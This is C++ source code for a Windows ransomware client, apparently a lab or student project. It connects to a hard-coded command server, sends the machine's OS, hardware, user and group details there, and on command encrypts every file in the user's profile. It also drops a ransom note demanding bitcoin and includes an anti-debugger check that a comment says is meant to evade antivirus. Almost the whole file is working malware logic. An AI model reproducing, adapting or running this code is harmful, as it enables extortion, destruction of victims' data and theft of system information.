#include "win_client.h"
#include "encrypt.h"
#include "decrypt.h"

EVP_PKEY* privKeyGlobal = nullptr; // Declare a global variable to store the private key

void initWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        //std::cerr << "WSAStartup failed: " << result << std::endl;
        exit(1);
    }
}

SOCKET connectSocket(const std::string& host, int port) {
    addrinfo hints = {0};  // Initialize hints to zero
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo* result = nullptr;
    int iResult = getaddrinfo(host.c_str(), std::to_string(port).c_str(), &hints, &result);
    if (iResult != 0) {
        //std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        exit(1);
    }

    SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET) {
        //std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        exit(1);
    }

    iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
        //std::cerr << "Unable to connect to server!" << std::endl;
        WSACleanup();
        exit(1);
    }

    freeaddrinfo(result);
    return ConnectSocket;
}

std::string getOSInfo() {
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

    if (!GetVersionEx((OSVERSIONINFO*)&osvi)) {
        return "Failed to get OS version\n";
    }

    std::ostringstream info;
    info << "OS Version: " << osvi.dwMajorVersion << '.' << osvi.dwMinorVersion << "\n"
         << "Build Number: " << osvi.dwBuildNumber << "\n"
         << "OS Type: " << (osvi.wProductType == VER_NT_WORKSTATION ? "Workstation" : "Server") << "\n";
    return info.str();
}

std::string getProcessorInfo() {
    std::array<int, 4> cpuInfo;
    __cpuid(cpuInfo.data(), 0);
    int nIds = cpuInfo[0];

    char brand[0x40] = {0};
    if (nIds >= 0x80000004) {
        __cpuid(reinterpret_cast<int*>(brand), 0x80000002);
        __cpuid(reinterpret_cast<int*>(brand + 16), 0x80000003);
        __cpuid(reinterpret_cast<int*>(brand + 32), 0x80000004);
    }

    std::ostringstream info;
    info << "Processor Brand: " << brand << "\n";
    return info.str();
}

std::string getMemoryInfo() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);

    std::ostringstream info;
    info << "Total Physical Memory (GB): " << statex.ullTotalPhys / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Free Physical Memory (GB): " << statex.ullAvailPhys / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Total Virtual Memory (GB): " << statex.ullTotalVirtual / (1024.0 * 1024.0 * 1024.0) << "\n"
         << "Free Virtual Memory (GB): " << statex.ullAvailVirtual / (1024.0 * 1024.0 * 1024.0) << "\n";
    return info.str();
}

std::string getDiskInfo() {
    ULARGE_INTEGER freeBytesAvailableToCaller, totalNumberOfBytes, totalNumberOfFreeBytes;

    if (GetDiskFreeSpaceEx(NULL, &freeBytesAvailableToCaller, &totalNumberOfBytes, &totalNumberOfFreeBytes)) {
        std::ostringstream info;
        info << "Total Disk Space (GB): " << totalNumberOfBytes.QuadPart / (1024.0 * 1024.0 * 1024.0) << "\n"
             << "Free Disk Space (GB): " << totalNumberOfFreeBytes.QuadPart / (1024.0 * 1024.0 * 1024.0) << "\n";
        return info.str();
    } else {
        return "Failed to get disk information";
    }
}

std::string getUserInfo() {
    char username[UNLEN + 1];
    DWORD usernameLen = UNLEN + 1;

    if (GetUserName(username, &usernameLen)) {
        std::ostringstream info;
        info << "Current User: " << username << "\n";
        return info.str();
    } else {
        return "Failed to get user information";
    }
}

std::string getUsersAndGroupsInfo() {
    std::ostringstream info;

    DWORD entriesRead = 0, totalEntries = 0, resumeHandle = 0;
    PUSER_INFO_0 userBuffer = nullptr;

    NET_API_STATUS status = NetUserEnum(
        NULL,
        0,
        FILTER_NORMAL_ACCOUNT,
        (LPBYTE*)&userBuffer,
        MAX_PREFERRED_LENGTH,
        &entriesRead,
        &totalEntries,
        &resumeHandle
    );

    if (status == NERR_Success) {
        for (DWORD i = 0; i < entriesRead; i++) {
            info << "User: " << userBuffer[i].usri0_name << "\n";

            PLOCALGROUP_USERS_INFO_0 groupBuffer = nullptr;
            DWORD groupEntriesRead = 0, groupTotalEntries = 0;

            status = NetUserGetLocalGroups(
                NULL,
                userBuffer[i].usri0_name,
                0,
                LG_INCLUDE_INDIRECT,
                (LPBYTE*)&groupBuffer,
                MAX_PREFERRED_LENGTH,
                &groupEntriesRead,
                &groupTotalEntries
            );

            if (status == NERR_Success) {
                for (DWORD j = 0; j < groupEntriesRead; j++) {
                    info << "  Group: " << groupBuffer[j].lgrui0_name << "\n";
                }
                NetApiBufferFree(groupBuffer);
            }
        }
        NetApiBufferFree(userBuffer);
    }

    return info.str();
}

std::string getAllSystemInfo() {
    std::ostringstream info;

    info << getOSInfo() << getProcessorInfo() << getMemoryInfo() 
         << getDiskInfo() << getUserInfo() << getUsersAndGroupsInfo();

    return info.str();
}

void sendData(SOCKET sock, const std::string& data, EVP_PKEY* pubKey) {
    // Convert the string to a byte buffer
    const char* buffer = data.c_str();
    int len = data.size();

    send(sock, buffer, len, 0);
}

std::wstring TCHARToWString(const TCHAR* tcharArray) {
   #ifdef UNICODE
   return std::wstring(tcharArray);
   #else
   std::string str(tcharArray);
   return std::wstring(str.begin(), str.end());
   #endif
}

std::vector<char> receivePublicKey(SOCKET sock) {
    std::vector<char> buffer(4096);
    int bytesReceived = recv(sock, buffer.data(), buffer.size(), 0);
    if (bytesReceived == SOCKET_ERROR) {
        //std::cerr << "Failed to receive public key\n";
        return {};
    }
    buffer.resize(bytesReceived);
    return buffer;
}

void savePrivateKey(const std::vector<char>& keyData, const std::string& filePath) {
    std::ofstream keyFile(filePath, std::ios::binary);
    if (!keyFile) {
        //std::cerr << "Failed to open file: " << filePath << "\n";
        return;
    }
    keyFile.write(keyData.data(), keyData.size());
    keyFile.close();
    //std << "Private key successfully saved to " << filePath << ".\n";
}

EVP_PKEY* loadPublicKey(const std::vector<char>& pemKey) {
    BIO* bio = BIO_new_mem_buf(pemKey.data(), static_cast<int>(pemKey.size()));
    EVP_PKEY* pubKey = PEM_read_bio_PUBKEY(bio, NULL, NULL, NULL);
    BIO_free(bio);
    return pubKey;
}

// Implementation of toWide
std::wstring toWide(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

// Implementation of toNarrow
std::string toNarrow(const std::wstring& wstr) {
    return std::string(wstr.begin(), wstr.end());
}

// Conversion function: std::wstring to LPCSTR
const char* wstringToLPCSTR(const std::wstring& wstr) {
    // Convert the wide string to a UTF-8 narrow string
    static std::string narrowString = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wstr);

    // Return a pointer to the C-style string
    return narrowString.c_str();
}

// Convert EVP_PKEY to a PEM string
std::string EVPKeyToPEMString(EVP_PKEY* key) {
    if (!key) {
        return "";
    }

    // Create a memory BIO to write to
    BIO* mem = BIO_new(BIO_s_mem());
    if (!mem) {
        //std::cerr << "Failed to create memory BIO\n";
        return "";
    }

    // Write the key to the memory BIO in PEM format
    if (!PEM_write_bio_PUBKEY(mem, key)) {
        BIO_free(mem);
        //std::cerr << "Failed to write key to BIO\n";
        return "";
    }

    // Get the contents of the BIO
    char* buffer = nullptr;
    long len = BIO_get_mem_data(mem, &buffer);
    std::string pemString(buffer, len);

    BIO_free(mem);
    return pemString;
}

// Main command handler
void handleCommand(const std::string& cmd, EVP_PKEY* pubKey) {
    std::string cmdPrefix = cmd.substr(0, 3);
    std::string filePath = cmd.substr(3);
    std::wstring fileWPath = std::wstring(filePath.begin(), filePath.end());

    if (cmd.rfind("pk", 0) == 0) {
        //printf("Attempting to store private key.\n");
        // Convert received data to a vector of chars
        std::vector<char> keyData(cmd.begin() + 2, cmd.end());

        // Load the private key from the received data
        BIO* bio = BIO_new_mem_buf(keyData.data(), static_cast<int>(keyData.size()));
        privKeyGlobal = PEM_read_bio_PrivateKey(bio, NULL, NULL, NULL);
        BIO_free(bio);

        if (privKeyGlobal) {
            //std::cout << "Private key successfully loaded.\n";
            savePrivateKey(keyData, "received_private_key.pem");
        } else {
            //std::cerr << "Failed to load private key.\n";
        }
    } else if (cmdPrefix == "enc") {
        TCHAR userProfileDir[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
            std::wstring userProfileDirW = TCHARToWString(userProfileDir);

            // Full path construction
            std::wstring fullFilePath = userProfileDirW + L"\\" + fileWPath;

            std::wcout << L"file path: " << fullFilePath << std::endl;

            std::string pubKeyString = EVPKeyToPEMString(pubKey);
            if (!EncryptFileWithKey(wstringToLPCSTR(fullFilePath), pubKeyString.c_str())) {
                //std::wcerr << L"Failed to encrypt file: " << fullFilePath << std::endl;
            }
        } else {
            //std::wcerr << L"Failed to retrieve user profile directory.\n";
        }
    } else if (cmdPrefix == "dec") {
        if (privKeyGlobal) {
            std::string privKeyString = EVPKeyToPEMString(privKeyGlobal);
            if (!DecryptFileWithKey(wstringToLPCSTR(fileWPath), privKeyString.c_str())) {
                //std::wcerr << L"Failed to decrypt file: " << fileWPath << std::endl;
            }
        } else {
            //std::cerr << "No private key available for decryption.\n";
        }
    } else if (cmd.rfind("ran", 0) == 0) {
        TCHAR userProfileDir[MAX_PATH];

        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
            std::wstring userProfileDirW = TCHARToWString(userProfileDir);
            //std::wcout << L"User's profile folder: " << userProfileDirW << std::endl;

            std::vector<std::wstring> fileList;
            EnumerateFilesRecursive(userProfileDirW, fileList);

            std::string pubKeyString = EVPKeyToPEMString(pubKey);

            for (const auto& file : fileList) {
                //std::wcout << L"Encrypting file: " << file << std::endl;
                if (!EncryptFileWithKey(wstringToLPCSTR(file), pubKeyString.c_str())) {
                    //std::wcerr << L"Failed to encrypt file: " << file << std::endl;
                }
            }
            std::wstring filePathW = userProfileDirW + L"\\Desktop\\ransom_note.txt";
            // Convert wide string filePath to a UTF-8 narrow string
            std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
            std::string filePath = converter.to_bytes(filePathW);
            std::string content = "Your system has been encrypted. Pay Tom $1 BTC to restore your files.\n";

            std::ofstream outFile(filePath);
            outFile << content;
            outFile.close();
        }
    } else if (cmdPrefix == "res") {
        if (privKeyGlobal) {
            TCHAR userProfileDir[MAX_PATH];
            std::wstring userProfileDirW = TCHARToWString(userProfileDir);

            if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfileDir))) {
                std::vector<std::wstring> fileList;
                EnumerateFilesRecursive(userProfileDirW, fileList);

                for (const auto& file : fileList) {
                    if (!DecryptFileWithKey(wstringToLPCSTR(file), EVPKeyToPEMString(privKeyGlobal).c_str())) {
                        //std::wcerr << L"Failed to restore file: " << file << std::endl;
                    }
                }
            }
        } else {
            //std::cerr << "No private key available for restoration.\n";
        }
        EVP_PKEY_free(privKeyGlobal);
    } else {
        //std::cerr << "Unknown command received.\n";
    }
}

// Helper function to wait for commands
void waitForCommands(SOCKET& clientSocket, EVP_PKEY* pubKey) {
    while (true) {
        std::vector<char> receivedData;

        try {
            //std << "Waiting for a command from the server...\n";

            while (true) {
                char buffer[4096];
                int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);

                if (bytesReceived <= 0) {
                    break;
                }

                receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);

                if (bytesReceived >= 3 && std::equal(buffer + bytesReceived - 3, buffer + bytesReceived, "EOF")) {
                    receivedData.erase(receivedData.end() - 3, receivedData.end());
                    break;
                }
            }

            if (!receivedData.empty()) {
                std::string cmd(receivedData.begin(), receivedData.end());
                handleCommand(cmd, pubKey);
            }
        } catch (const std::exception& e) {
            //std::cerr << "Error: " << e.what() << "\n";
            break;
        }

        if (receivedData.empty()) {
            break;
        }
    }
}

int main(int argc, char* argv[]) {
    /* Implemented custom assembly instead of using Win32 API to CheckDebugger to evade AV */
    /* Get PEB from asm */
    PPEB pPEB = getPEB();

    /* Exit if being debugged */
    if (CheckDebugger() != 0) {
        return EXIT_FAILURE;
    }

    /*
    if (argc < 3) {
        //std::cerr << "Usage: " << argv[0] << " <host> <port>\n";
        return 1;
    }

    std::string host = argv[1];
    int port;
    try {
        port = std::stoi(argv[2]);
    } catch (const std::invalid_argument&) {
        //std::cerr << "Invalid port number: " << argv[2] << "\n";
        return 1;
    } catch (const std::out_of_range&) {
        //std::cerr << "Port number out of range: " << argv[2] << "\n";
        return 1;
    }
    */
   std::string host = "192.168.1.240";
   int port = 8888;

    initWinsock();

    SOCKET sock = connectSocket(host, port);
    if (sock == INVALID_SOCKET) {
        //std::cerr << "Failed to connect to server.\n";
        WSACleanup();
        return EXIT_FAILURE;
    }

    std::vector<char> pemKey = receivePublicKey(sock);
    EVP_PKEY* pubKey = loadPublicKey(pemKey);
    if (!pubKey) {
        //std::cerr << "Failed to load public key.\n";
        closesocket(sock);
        WSACleanup();
        return EXIT_FAILURE;
    }

    std::string systemInfo = getAllSystemInfo();
    sendData(sock, systemInfo, pubKey);

    waitForCommands(sock, pubKey);

    EVP_PKEY_free(pubKey);
    closesocket(sock);
    WSACleanup();

    return EXIT_SUCCESS;
}
